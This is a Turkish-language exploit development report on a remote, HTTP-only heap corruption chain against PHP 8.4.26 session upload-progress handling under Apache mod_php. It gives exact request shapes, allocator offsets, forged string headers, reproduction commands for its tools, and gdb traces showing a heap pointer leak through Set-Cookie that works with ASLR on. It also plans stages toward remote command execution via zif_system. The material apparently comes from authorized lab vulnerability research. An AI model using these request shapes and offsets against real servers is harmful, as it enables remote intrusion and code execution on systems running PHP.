# `display_errors`'a bağlı olmayan saf HTTP zinciri: ilerleme ve kalan kalibrasyon

Tarih: 2026-10-21
Hedef: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (`172.16.0.103`,
`display_errors=0`, `memory_limit=8M`, tek worker)
Kısıtlar: tamamen uzaktan, yalnızca sıradan multipart HTTP gönderilir; hedef sayfası
`<?php echo "OK\n"; ?>` (`session_start()` yok); hedef `/proc` okunmaz.

---

## 1. Sonuç (mevcut durum)

`display_errors=0` altında, **uyarı (warning) çıktısına bağlı olmayan OOM-in-cookie primitifi** zaten çalıştırıldı:

1. A isteği, `php_session_send_cookie()` içinde, `php_url_encode()`'un ilk
   `zend_string_safe_alloc(3, 32, 0, 0)` (121B → bin 128) çağrısında OOM olur;
2. OOM, `PS(send_cookie)=1`'den sonra ve `PS(send_cookie)=0`'dan önce gerçekleşir;
   istek bailout eder, `PS(id)` (32 karakterlik rastgele id) ile `PS(send_cookie)=1` artık kalır;
3. Hiçbir PHP uyarısı/çıktısı sürece dahil olmaz, `SG(headers_sent)` her zaman 0'dır;
4. Sonraki B isteğinin pre-RINIT `MULTIPART_EVENT_END → php_session_rfc1867_cleanup()
   → php_session_initialize()` akışı, A'dan kalan `PS(mod_data)` temizliğini aşabilir
   ve **sarkan `PS(id)`** ile `php_session_send_cookie()`'yi çağırabilir (`RESET_ID`/`SEND_COOKIE`
   breakpoint'leri fiilen isabet aldı, `send_cookie=1`).

Kalan tek adım, B tarafının sarkan id bloğunu tekrar sahte bir `zend_string` başlığı olacak
şekilde işgal etmesidir (ki `url_encode` kontrollü büyük bir uzunluk okusun); aynı zamanda
`php_rshutdown_session_globals()` bu id'yi serbest bırakırken artık `zend_mm_panic`
tetiklememelidir. **Bu adım da tamamlandı**: B, iki büyük alanla cached id chunk'ını page 510'a
serer; böylece ikinci alanın canlı (survivor) kopyası tam olarak pages 257–511'e düşer ve
page 511'in ilgili offset'ine sahte başlık + kuyruktaki başlatılmamış (uninitialized) bölge yazılır;
`url_encode` 4000 bayt okur, bunun son 3000 baytı A'nın page 511 kuyruğunda bıraktığı bin-64
freelist işaretçileridir.

Fiilî test (`display_errors=0`):

```text
Set-Cookie: PHPSESSID=MMMM...（1000 bayt M, ardından 4000 bayt çözümlenmiş (decode) sonuç）
decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000     # no-ASLR
decoded=4000 ptrs=47 chunk_base=0x7f9acd000000     # ASLR-on
decoded=4000 ptrs=47 chunk_base=0x7f1416e00000     # ASLR-on
```

ASLR yokken 3/3, ASLR açıkken 2/2 (hepsi `display_errors 0` olduğu doğrulanmış yapılandırmada);
başarısız örnekler yalnızca page 511'i ıskalar (normal 32 baytlık cookie döner), çökmez.

### 1.1 Hedef sayfası `session_start`'a ihtiyaç duymaz

Bu turdaki testin hedef sayfası şudur:

```php
<?php echo "OK\n"; ?>
```

`session_start()` yok. Zincir yine de geçerli kalır, çünkü session başlatma RINIT'ten önce
`session.upload_progress` callback'inde gerçekleşir:

- A: `MULTIPART_EVENT_FILE_START → php_session_rfc1867_update →
  php_session_initialize()`;
- B: `MULTIPART_EVENT_END → php_session_rfc1867_cleanup →
  php_session_initialize()`.

İkisi de script yürütülmeden önce olur, dolayısıyla sayfanın `session_start()` çağırıp çağırmaması
açık zinciriyle (exploit chain) ilgisizdir.
Fiilî test (aynı session'sız sayfa):

- `display_errors=0` forge sızıntısı: 4000 bayt / 47 işaretçi, chunk base
  `0x7ffff3e00000` (kanıt `logs/nosession_forge_20261021.resp`);
- eski `display_errors=1` aşama 1 sızıntısı: 4096 bayt / 98 işaretçi, chunk base
  `0x7ffff5e00000` (kanıt `logs/nosession_classic_leak_20261021.resp`).


---

## 2. Eski zincir neden `display_errors`'a bağımlıydı

Eski A, `max_input_vars` uyarısıyla `SG(headers_sent)`'i 1 yapar; bu da
`php_session_send_cookie()`'nin `FAILURE` dönmesine neden olur:

```c
if (SG(headers_sent)) { ... return FAILURE; }   /* send_cookie hâlâ 1 */
```

`php_session_reset_id()` `FAILURE` döner → `php_session_initialize()`
`php_session_abort()`'u çağırır → `ps_close_files()` `PS(mod_data)`'yı normal şekilde
serbest bırakır (NULL yapar). Böylece B'nin `s_open`'ı `mod_data == NULL` görür ve sarkan
işaretçiye dokunmaz; B'nin yalnızca raw buffer ile sarkan id bloğunu yeniden işgal etmesi yeterlidir.

`display_errors=0` iken uyarı çıktısı olmaz, `headers_sent` set edilmez ve bu "FAILURE +
abort" yolu ortadan kalkar. Geriye tek seçenek, OOM'un doğrudan `send_cookie` içinde
gerçekleşmesini sağlamaktır:

- `send_cookie` geri dönmez, `PS(send_cookie)=1` korunur;
- ancak `php_session_abort()` da çalışmaz, `PS(mod_data)` sarkan işaretçiye dönüşür;
- B'nin `s_open`'ı önce `ps_close_files(sarkan mod_data)` yapar; işte bu yeni bir sorundur.

---

## 3. A: OOM-in-cookie'nin tahsis (allocation) gerçekleri

`php_session_send_cookie()` (8.4.26) ilk tahsisi:

```c
e_id = php_url_encode(ZSTR_VAL(PS(id)), ZSTR_LEN(PS(id)));
```

`php_url_encode_impl()`:

```c
start = zend_string_safe_alloc(3, len, 0, 0);   // len = 32
```

İstek boyutu = `24 + 3*32 + 1 = 121` → **bin 128** (1 sayfalık run, 32 slot).
`send_cookie` girişinde yalnızca şunların aynı anda sağlanması yeterlidir:

- `heap->free_slot[11] == NULL` (bin 128 boş)
- dört chunk'ın `free_pages` toplamı 0

Bu durumda tahsis `zend_mm_alloc_small_slow(heap, 11)` →
`zend_mm_alloc_pages(1)` → free page yok → `zend_mm_safe_error` → bailout yolunu izler.

### 3.1 İstek şekli

`tools/send_a_oom5.py`, fiilen kararlı (stabil) parametreler:

```text
F=0  S=62  NB=235  BL=15000  X=208  K=0  KL=4000  FL=103
```

- **S=62 tek isimli alan**: isim 103B (zend_string = 128 → bin 128), değer 8B.
  Her alanın filter değer kopyası bin 40'tır; isim 1 adet bin-128 canlı blok katkısı yapar.
  Dosya kısmı (alan adı 103B + filename 103B) 2 adet bin-128 canlı blok daha katar.
  Toplam `62 + 2 = 64 = 2×32` → `free_slot[11]` tam olarak boş kalır.
  (Dikkat: 103B değerli alan 3 adet bin-128 canlı blok katkısı yapar, bu yüzden burada mutlaka 8B değer kullanılmalı.)
- **NB×BL = 235 × 15000B**: büyük alanlar belleği doldurur; her değerin 2 canlı kopyası vardır
  (`IF_G(post_array)` + `$_POST`), her biri `25+15000` → 4 sayfa, alan başına toplam 8 sayfa.
- **X=208 adet 231B değer**: bin 256 (sayfa başına 16 slot), her alan 2 canlı slot + 1 geçici
  raw slot; her 8 alanda bir yeni 256B run (1 sayfa) tetiklenir; bu da 1 sayfa granülerliğinde kapanış (trim) için kullanılır.

### 3.2 gdb kanıtı

`logs/oomcookie_A_20261021.log`:

```text
SEND_COOKIE id=0x7ffff3fff000 len=32 size=8253840 real=8388608 limit=8388608
            free_pages=0 chunks=[0,0,0,0] fs7=.../63 fs9=0/0 fs11=0x0/0
MM_SAFE_ERROR real=8388608 limit=8388608 size=8253968
PS_AT_OOM id=0x7ffff3fff000 len=32 send_cookie=1
#3 zend_string_safe_alloc (persistent=false, l=0, m=32, n=3)
#4 php_url_encode_impl (raw=false, len=32, s=0x7ffff3fff018 "...")
#5 php_url_encode
#6 php_session_send_cookie
#7 php_session_reset_id
#8 php_session_initialize
#9 php_session_rfc1867_update
```

Kilit noktalar:

- `real=8M=limit`: 4 chunk zaten eşlenmiş (mapped), yeni mmap yapılamaz;
- `free_pages=0`, `fs11=0`: `url_encode`'un bin-128 run'ını koyacak yer yok;
- OOM tam olarak `php_url_encode_impl`'de düşer, parse/büyük alan aşamasında değil;
- `PS_AT_OOM send_cookie=1`: `PS(send_cookie)` 0'a temizlenmemiştir, `PS(id)` hâlâ
  32 karakterlik rastgele id'ye işaret eder (`id=0x7ffff3fff000`, chunk `0x7ffff3e00000`'in page 511'inde).

A'nın yanıtı `500 Internal Server Error`, boş body (display_errors=0 çıktı vermez),
worker hayatta kalır.

### 3.3 Kalibrasyon yöntemi

`tools/trial_bins.sh` her seferinde Apache'yi yeniden başlatır (`setarch -R`), gdb iliştirir, A gönderir;
`SEND_COOKIE` / `MM_SAFE_ERROR` yazdırır. X'i ayarlamak (±1) `free_pages`'i 0 ile sıfır-dışı
arasında kaydırabilir; `fs11` yalnızca S tarafından belirlenir (S ≡ 30 mod 32).
Mevcut S=62 iken X=206..212 aralığının tümü `free_pages=0, fs11=0`'ı yakalayabilir.

---

## 4. B: sarkan `PS(mod_data)`'yı aşmak

### 4.1 Çökme mekanizması

B'nin `MULTIPART_EVENT_END → php_session_rfc1867_cleanup() →
php_session_initialize()`:

```c
PS(mod)->s_open(&PS(mod_data), ...)          /* ps_open_files */
    data = ecalloc(1, sizeof(ps_files));     /* 40B -> bin 40 */
    data->basedir = zend_string_init("/tmp");
    if (PS_GET_MOD_DATA()) ps_close_files(mod_data);   /* <- sarkan işaretçi */
    PS_SET_MOD_DATA(data);
```

A'nın `PS(mod_data)`'sı bir `ps_files*`'tır (`ecalloc(1,40)`), adres fiilen
`0x7ffff5e7f500` (ana chunk + `0x7f500`, bin-40 slot 32). A'nın shutdown'ı
session RSHUTDOWN'ını çalıştırmadı, bu yüzden bu işaretçi sarkan durumdadır.

Eğer B'de bu adres geçerli bir blok değilse, `ps_close_files()` içindeki `efree(data)`
`zend_mm_panic("zend_mm_heap corrupted")`'ı tetikler (`chunk->heap` kontrolü).

### 4.2 Çözüm: o sayfayı B içinde herhangi bir SRUN sayfası hâline getirmek

`zend_mm_free_heap()` SRUN sayfaları için **blok hizalama (alignment) kontrolü yapmaz**, yalnızca
`chunk->heap == heap`'i kontrol eder, ardından `zend_mm_free_small(heap, ptr, bin)` doğrudan
freelist'e ekler. Dolayısıyla B, `0x7ffff5e7f500`'in bulunduğu sayfayı (ana chunk page 127)
küçük bir bin'in run sayfasına çevirdiği sürece, `efree(data)` panic yapmaz.

Fiilî B şekli:

```text
N=160 alan, değer uzunluğu 231B (bin 256)
```

B'nin `ps_open_files` breakpoint'inde:

```text
new=0x7ffff5e64028 pg=100 info=0x80000004
old=0x7ffff5e7f500 pg=127 chunk_heap=0x7ffff5e00040 match=1 info=0x8000000f
last_key=0x7ffff5e7f600 basedir=0x7ffff5e022c0 fd=-1
```

- page 127, SRUN bin 15'tir (256B), slot 5 tahsis edilmemiştir (bu run'ın 12 boş slotu daha var);
- `last_key` aynı run'ın bir sonraki boş slot işaretçisidir (güvenli);
- `basedir` hâlâ A'nın `/tmp` zend_string işaretçisidir (güvenli, bin-32 sayfa SRUN);
- `fd=-1`.

`ps_close_files` böylece geri döner, `s_open` yepyeni geçerli bir `mod_data` ayarlar;
initialize, sarkan id'nin ilk baytının 0 olmadığını görür (A'nın rastgele id'si hâlâ eksiksizdir),
create-id adımını atlar ve doğrudan `php_session_reset_id()`'ye gider:

```text
RESET_ID id=0x7ffff3fff000 len=32 send_cookie=1
SEND_COOKIE id=0x7ffff3fff000 len=32 ... free_pages=370 ...
```

**B zaten sarkan id ile `php_session_send_cookie()`'yi çağırdı** (çünkü A'nın id'si hâlâ duruyor,
`send_cookie=1` hâlâ aktif). Bu adım, eski zincirdeki `display_errors` bağımlılığının yerini alır.

### 4.3 Kalan çökme: rshutdown sarkan id'yi serbest bırakıyor

`MULTIPART_EVENT_END`, cleanup'tan sonra koşulsuz çalışır:

```c
php_rshutdown_session_globals();
    ...
    if (PS(id)) { zend_string_release_ex(PS(id), 0); PS(id) = NULL; }
```

Sarkan id, chunk `0x7ffff3e00000`'in page 511'inde bulunur (sayfa başı, adres
`0x7ffff3fff000`). Bu chunk, B içinde yalnızca bir **cached chunk**'tır:

```text
RSHUT_ID id=0x7ffff3fff000 base=0x7ffff3e00000 pg=511
          chunk_heap=0x0 match=0 info=0x0
          bytes=01000000160000000000000000000000   # refcount=1
```

`chunk_heap=0` → `zend_mm_free_heap`'in `chunk->heap == heap` kontrolü başarısız olur →
panic. A'nın id zend_string'i hâlâ `refcount=1` taşıdığı için, release efree denemesi yapar.

---

## 5. B'nin forge'u (uygulandı)

### 5.1 Hedef

B'nin, `send_cookie`'den önce sarkan id bloğunu kontrollü içerikle yeniden işgal etmesini sağlamak
(`0x7ffff3e00000 + 0x1ff000`, yani o chunk'ın page 511 slot 0'ı), şöyle ki:

- `PS(id)+0x10` (len) = 4000;
- `PS(id)+0x00` rshutdown anında refcount=1 olmamalı (free sonrası freelist next olur);
- `url_encode`, `PS(id)+0x18`'den 4000 bayt okur; ilk 1000 bayt dolgudur (padding), son 3000
  bayt A'nın page 511 kuyruğunda bıraktığı bin-64 freelist işaretçileridir;
- `url_encode`'un `3*len` tahsisi (12000B → 3 sayfa) B içinde başarılı olabilsin.

### 5.2 İki alanla sayfa serme (page tiling)

B'nin body sırası (`send_b_open.py`):

```text
160 × 231B değer (bin-256 run, ana chunk page 127'yi 12 boş slotlu partial run yapar)
1 × 1,048,551B değer (BB1, zend_string = 256 sayfa)
1 × 1,041,384B değer (BF, zend_string = 255 sayfa, sahte yük/payload)
PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS
(dosya kısmı yok, pre-RINIT END cleanup yolunu izler)
```

Tahsis dizisi (fiilen gözlemlenen):

1. BB1'in raw'ı (256 sayfa) önce ana chunk'ın free tail'ine düşer, ardından serbest bırakılır;
2. BB1'in iki canlı kopyasından biri cached id chunk'ını alır (`chunk_init`),
   pages 1–256'ya düşer;
3. BF'nin raw'ı (255 sayfa) ana chunk'ın free tail'ini yeniden kullanır, ardından serbest bırakılır;
4. BF'nin canlı kopyası id chunk'ın pages 257–511'ine düşer (çünkü 257–511 tam olarak 255 sayfadır,
   Best-Fit kesin isabet eder) ve page 511 üzerine yazılır.

Böylece `PS(id)` (page 511) **canlı bir zend_string'in veri bölgesinin** içine düşer;
veri, sonraki tahsislerle değiştirilmez.

### 5.3 Sahte başlık yerleşimi

BF'nin tahsis başlangıcı `S = chunk + 257*4096`, page 511 ise `S + 254*4096`'dadır.
zend_string verisi `S+0x18`'den başlar, dolayısıyla sahte başlığın değer (value) içindeki offset'i:

```text
D = (510 - 256) * 4096 = 254 * 4096 = 1,040,384
gc    D-24'te : 0x4141414141414141   (rshutdown anında refcount != 1)
h     D-16'da : 0
len   D-8'de  : 4000
data  D'de    : 'M' * 1000, ardından value biter (L2 = D+1000)
```

BF'nin tahsis boyutu `25 + L2 = 1,041,409` → 255 sayfa (pages 257–511 ile tam hizalı).
value verisi page 511 içinde yalnızca 1000 bayta kadar yazılır, sonraki ~3000 bayt başlatılmamış
bölgedir ve A döneminden kalma page 511 kuyruğundaki bin-64 freelist işaretçilerini korur.

### 5.4 Fiilî sonuç

`SEND_COOKIE id=0x7ffff3fff000 len=4000`; `RSHUT_ID ... bytes=41414141...`
(match=1, artık panic yok); yanıt `200 OK`, `Set-Cookie` çözümlendiğinde 4000 bayt:

```text
logs/oomcookie_leak_noaslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7ffff3e00000

logs/oomcookie_leak_aslr_20261021.resp:
  decoded=4000 ptrs=47 chunk_base=0x7f9acd000000
  (başka bir ASLR turu: 0x7f1416e00000)
```

47 işaretçinin tamamı chunk içi adreslerdir (ör. `0x7ffff3fff400/…f480/…f4c0`);
2MB hizalı mod (en sık görülen değer) alınarak chunk base elde edilir.

### 5.5 Çoğaltma

```bash
# no-ASLR
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

### 5.6 Kararlılık (stability)

- no-ASLR 3/3; ASLR-on 2/2 (hepsi display_errors=0 altında);
- başarısız örnek: page 511 üzerine yazılmaz, `len` hâlâ 32'dir, normal 32 baytlık cookie döner,
  çökmez; tekrar denemek yeterlidir;
- `trial_ab.sh`'nin fresh-worker + gdb attach kontrolüne bağımlıdır (breakpoint pending iken tekrar dener).

### 5.7 Doğrulanmış liste

- [x] `display_errors=0` altında A, `php_url_encode`'da OOM, `send_cookie=1`
- [x] A'nın `PS(id)`'si sarkan ve istekler arası korunuyor
- [x] B'nin `ps_close_files(sarkan mod_data)` çağrısı panic yapmıyor (SRUN sayfa + boş slot hizalaması)
- [x] B sarkan id ile `send_cookie`'yi çağırıyor (`RESET_ID`/`SEND_COOKIE` isabet)
- [x] B cached chunk alıyor (`chunk_heap != 0`), rshutdown artık panic yapmıyor
- [x] İki alanla sayfa serme + BF kopyası page 511'in üzerine yazıyor, sahte len=4000
- [x] `Set-Cookie` 47 chunk içi işaretçi içeriyor, chunk base çözülebiliyor (ASLR dahil)

## 6. Kalan mühendislik (stage-2/3)

### 6.1 stage-2'nin kesin kısıtları (display_errors=0)

stage-2'nin okuması gereken şey gerçek bir HashTable'dır:

```text
PS(id)+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
PS(id)+0x18 = HT+0x28 = nNextFreeElement                -> verinin 1. qword'ü
PS(id)+0x20 = HT+0x30 = pDestructor (libphp+0x613c50)    -> verinin 2. qword'ü
```

Bu nedenle ya `PS(id) = HT+0x10` olmalı, ya da page-511 forge ile len büyütülmeli ve
okuma penceresi arkadaki gerçek HashTable'ı kapsamalıdır.

Mevcut 0 zincirindeki `PS(id)`, cached id chunk'ın **son sayfasıdır** (page 511,
`chunk+0x1ff000`). Okuma penceresi `PS(id)+0x18`'den sayfa sonuna kadardır, en fazla ~0xFE8 bayt,
ve **bu chunk'ın dışına çıkamaz** (arkadaki adresler eşlenmemiştir). Bu nedenle:

1. Gerçek HashTable mutlaka page 511 içinde olmalıdır;
2. page 511 yalnızca **tek bir bin'in run'ını** taşıyabilir: ya bin-56 (HashTable
   yapısı, 56B) olur, ya da forge'u taşıyan büyük nesne; ikisi bir arada olamaz;
3. page 511 bin-56 run yapılırsa: slot 0'a önceden serbest bırakılmış 55B'lik raw buffer
   konur (+0x10 = sahte len, +0x18 = veri), slot 1'e gerçek HashTable konur
   (pDestructor page+0x68'de), okuma penceresi tam olarak kapsar;
4. ancak bu 1 sayfalık run yalnızca **ana chunk'ta boş sayfa olmadığında** id chunk'ın
   page 511'ine düşer; şu anda B'nin ana chunk'ında hâlâ 370 free page var, 1 sayfalık run
   öncelikli olarak ana chunk'a düşer.

### 6.2 Yapılan deneyler

- **Geç büyük alan**: X trimmer'ından önce 50/100 sayfalık bir alan eklenir, onun raw buffer'ı
  serbest bırakıldıktan sonra ana chunk'ta delik bırakmaya çalışılır. Fiilen NB=235 iken doğrudan
  OOM olur; NB=215/208 iken `send_cookie`'ye ulaşılabilir ama id hâlâ 0x3e/0x3d chunk'tadır,
  `url_encode` da OOM noktasına düşmez (free_pages > 0). Nedeni, raw'ın 2 canlı kopyasının kararlı-hâl
  belleğini doldurması ve raw'ın serbest bıraktığı sayfaların tek başına son sayfa olmaya yetmemesidir.
- **arData 513. genişleme (resize)**: 513. insert'i X kuyruğuna itmek OOM yapar (10 sayfalık
  sürekli alan gerekir); bigs'in ortasına itmek ise eski arData'nın 4 sayfalık deliğini sonraki
  big'in 4 sayfalık kopyasının tam olarak yutmasına yol açar.
- **Sonuç**: stage-2'yi tamamlamak için açıkça "ana chunk'ı canlı kopyalarla doldur +
  id chunk'ta page 511 bırak + bin-56 run'ı 511'e düşür" üç aşamalı heap şekillendirmesi gerekir;
  bu bir sonraki adımın kalibrasyon işidir, tek bir parametre ayarıyla çözülemez.

### 6.3 Yeni primitif (2026-10-21 akşamı): stale id'yi canlı string'in içine kaydırmak

Yukarıdaki 5.x yolu `PS(id)`'yi cached chunk'ın page 511'inde bırakıyor; bu tur ise
**ana chunk içinde, page-511 forge'una bağlı olmayan** bir yola geçti ve 16KB'lık sınır-dışı okuma
fiilen elde edildi:

1. A, `WARM_LEN=60` temeline bir de 32 baytlık değer alanı ekler (`W64_LEN=32`,
   stored zend_string = 24+32+1 = 57 → bin-64). Bu önce page 128'in bin-64 run'ının
   slot 0'ını işgal eder, `php_session_create_id`'nin 32 baytlık id'si **slot 1**'e düşer:
   `PS(id) = chunk + 0x80080` (page 128 + 0x80).
2. B yine N=160 adet 231B değer alanı kullanır; page 128 bir bin-256 run'dır, slot 0 ise
   **canlı** bir 231B string'tir. `PS(id)=page+0x80` tam olarak bu string'in
   data bölgesinin içine düşer:
   - id'nin len alanı `PS(id)+0x10 = page+0x90 = value[0x78]`'de;
   - id'nin data'sı `PS(id)+0x18 = page+0x98 = value[0x80]`'den başlar.
   **Her** değer string'inin offset 0x78'ine `0x4000`, offset 0x80'ine sıfır-olmayan bir bayt
   (`V`) yazılırsa, B'nin `send_cookie`'si 0x4000'e göre URL-encode yapar:
   header kontrolü (`ZSTR_VAL(id)[0] != 0`) de geçer, çünkü o bayt bizim yazdığımız `V`'dir.
3. Artık free-list/forge'un stale bloğa düşmesine gerek yok, cached chunk da gerekmiyor.

Fiilî parametreler ve sonuç (no-ASLR, display_errors=0):

```bash
# A: WARM=60 id'yi ana chunk'a taşır; W64=32 id'yi page+0x00'dan page+0x80'e iter
WARM_LEN=60 W64_LEN=32 ./trial_bins.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT/RESET_ID/SEND_COOKIE id=0x7ffff5e80080 len=32
#   MM_SAFE_ERROR hâlâ php_url_encode'da; PS_AT_OOM send_cookie=1

# B: N=160 adet 231B değer, değer içi offset 0x78'de sahte len=0x4000
WARM_LEN=60 W64_LEN=32 BN=160 BVL=231 BVAL_OFF=0x78 BVAL_LEN=0x4000 \
  ./trial_ab.sh 0 62 235 15000 204 0 4000 103
#   SESSION_INIT id=0x7ffff5e80080 len=16384 send_cookie=1
#   SEND_COOKIE  id=0x7ffff5e80080 len=16384
#   Set-Cookie PHPSESSID=...(20616 karakter, 16392 bayt çözümlenir)
```

Yanıt arşivi: `logs/oomcookie_shift_leak_20261021.resp`. Çözümlenen 16KB,
page 128'den başlayan bin-256 string slotlarıdır (her biri `gc=0x…0001, h=0, len=0xe7,
data='V'*231`), yani **kontrollü uzunluklu, slotlar/bloklar arası heap okuması** artık geçerlidir;
pencere içeriği şu anda tamamen alan string'lerinin kendisidir, henüz libphp kod işaretçisi yoktur.

### 6.4 Yeni primitif altında stage-2'nin çözülmeyi bekleyen iki kısıtı

16KB'lık pencereyi libphp sızıntısına dönüştürmek için, pencerede **gerçek HashTable yapısının**
belirmesi gerekir (`pDestructor = libphp+0x613c50`, `HT+0x30`'da). Hizalama ilişkisi şudur:

```text
PS(id) = HT + 0x10
  id+0x10 = HT+0x20 = nTableSize | nInternalPointer   -> len
  id+0x18 = HT+0x28 = nNextFreeElement                -> veri[0]
  id+0x20 = HT+0x30 = pDestructor                     -> veri[8]
```

Mevcut A'nın `PS(id)=page128+0x80`'i tam olarak bin-56 run'ının **slot 2 + 0x10**'una eşittir
(bin-56 slot adımı 0x38, slot2=0x70), bu yüzden B'nin bin-56 run'ı page 128'e düştüğü ve
slot 2 `nTableSize>=16` olan bir dizi HashTable'ı olduğu sürece `pDestructor` doğrudan
sızdırılabilir. Fiilen iki takılma noktası:

1. **bin-56'nın free-list başlangıcı**: B'nin `SESSION_INIT` anında bin-6
   (56B) free chain uzunluğu **64**'tür (tam bir boş sayfa, A'nın request
   shutdown'ından gelir). Önce bu 64 slot tüketilmeli ki 65. HashTable yeni bir run yaratsın;
   oysa dizi alanının key/value string'leri (bin-32/40/48) bundan önce kendi run'larını kurar
   ve page 128'i kapar (fiilen page 128 bin-3/bin-4 olur, id garbage/len=1 okur).
2. **page 127'deki stale `ps_files`**: display_errors=0 olan A, `php_url_encode` içinde OOM olur,
   `php_session_abort()` çalışmaz, `PS(mod_data)` hâlâ sarkan ps_files'tır (page 127 + 0x500).
   B'nin END cleanup'ı önce `ps_close_files` sonra `send_cookie` yapar. page 127 B tarafından
   **uygun bir bin'in SRUN sayfasına** yeniden tahsis edilmeli ve `+0x500` slotu canlı string
   olmamalıdır (aksi hâlde `last_key/basedir` bir zend_string başlığı okur ve
   `zend_string_release` çöker). 5.x'in N=160 şekli tam olarak page 127'yi bin-256 ve slot 5'i
   boş yapar; dizi/kuyruk alanları eklendiğinde page 127 free/bin-32/bin-40 olur ve
   `zend_mm_panic` ya da SIGSEGV tetiklenir. Şu anda aynı anda
   "page 127 slot5 güvenli + page 128 bin-56 run slot2 HashTable" koşullarını sağlayan bir
   alan dizilimi henüz bulunamadı.

Bu iki nokta stage-2'nin saf kalibrasyon problemidir; stage-3'ün `zif_system` terminali
(`pDestructor=zif_system`, fake execute_data), stage-2 libphp base'i verdikten sonra
doğrudan `send_b_zif.py`'yi yeniden kullanabilir; yalnızca fake HT/fake-ref adreslerinin
yeni şekle göre yeniden kalibre edilmesi gerekir.

### 6.5 stage-3

`zif_system` terminali (`pDestructor=zif_system`, fake execute_data) libc'ye bağımlı değildir;
stage-2 libphp base'i verdiği anda `send_b_zif.py`'nin payload'u doğrudan yeniden kullanılabilir;
yalnızca fake HT adresi ile fake-ref düşüş noktası 0 zincirinin A/B şekline göre yeniden kalibre edilir.


## 7. Dosyalar ve komutlar

| Dosya | Amaç |
|---|---|
| `tools/send_a_oom5.py` | A: S adet 103B isim/8B değer + NB büyük alan + X adet 231B değer + dosya kısmı; isteğe bağlı `AQ_N/AQ_LEN` GET padding, `WARM_LEN`, `W64_LEN` (bin-64 kaydırma) |
| `tools/send_b_open.py` | B: N adet 231B değer + PHPSESSID + PROGRESS, dosya kısmı yok; `BB1_LEN` sayfa serme, `BF_P1/BF_READ` forge, `BVAL_OFF/BVAL_LEN` değer içi sahte len, `BUNIQ/DUP_*` benzersiz değer/aynı adlı alan, `NEST_*` iç içe dizi, `TAIL231/232` kuyruk alanı; isteğe bağlı Cookie/Header/GET padding |
| `tools/trial_bins.sh` | A-only kalibrasyon (yeniden başlat + gdb + A gönder) |
| `tools/trial_ab.sh` | fresh worker + gdb breakpoint çözüldükten sonra A/B gönder; `ASLR_ON=1` iken `setarch -R` açılmaz |
| `tools/g_bins.gdb` | gdb probu: `SEND_COOKIE`, `OPEN_FILES`, `RESET_ID`, `RSHUT_ID`, `MM_SAFE_ERROR`, chunk/page map, cached chunks, bin15 boş slot istatistiği |
| `logs/oomcookie_A_20261021.log` | A'nın gdb kanıtı (OOM'un kesin düşüş noktası) |
| `logs/oomcookie_AB_20261021.log` | A+B kanıtı (mod_data'yı aşma, B'nin send_cookie'si, eski şekil rshutdown panic) |
| `logs/oomcookie_forge_aslr_20261021.gdb.log` | forge başarısının gdb izi (len=4000, RSHUT bytes=4141…) |
| `logs/oomcookie_leak_noaslr_20261021.resp` | no-ASLR sızıntı yanıtı (decoded 4000, 47 ptrs, base 0x7ffff3e00000) |
| `logs/oomcookie_leak_aslr_20261021.resp` | ASLR sızıntı yanıtı (base 0x7f9acd000000) |
| `logs/oomcookie_leak_decode_20261021.txt` | Çözümleme sonucu özeti |
| `logs/oomcookie_shift_leak_20261021.resp` | Kaydırılmış id primitifinin 16KB sızıntı yanıtı (len=16384, 20616 karakter) |

Çoğaltma (hedef makine `~/php2shell-work`):

```bash
# A-only: OOM-in-cookie doğrulaması
./trial_bins.sh 0 62 235 15000 208 0 4000 103

# A + B (mod_data'yı aşar, page 511'in üzerine henüz yazmaz)
BN=160 BVL=231 ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# A + B forge (chunk sızıntısı)
BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103

# ASLR-on
ASLR_ON=1 BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
  ./trial_ab.sh 0 62 235 15000 208 0 4000 103
```

gdb'nin kilit çıktısı şunları içermelidir:

```text
SEND_COOKIE id=0x... len=32 free_pages=0 fs11=0x0/0
MM_SAFE_ERROR ... zend_string_safe_alloc(l=0, m=32, n=3) <- php_url_encode
PS_AT_OOM ... send_cookie=1
SESSION_INIT (B) id=0x7ffff3fff000 len=32 send_cookie=1
OPEN_FILES old=... info=0x8000000f last_key=... basedir=... fd=-1
RESET_ID id=0x7ffff3fff000 send_cookie=1
SEND_COOKIE (B) id=0x7ffff3fff000 len=4000
RSHUT_ID ... bytes=4141414141414141... match=1
```

---

## 8. Sorumluluk reddi (disclaimer)

Yalnızca yetkili ortamlarda güvenlik açığı araştırması ve çoğaltma amaçlıdır. İstek şekilleri,
bin dizileri ve offset bağlamaları bu lab'ın PHP 8.4.26 build'ine, 8M memory_limit'e,
files save handler'a ve tek worker prefork'a bağlıdır; build/yapılandırma değişince yeniden
kalibrasyon gerekir.
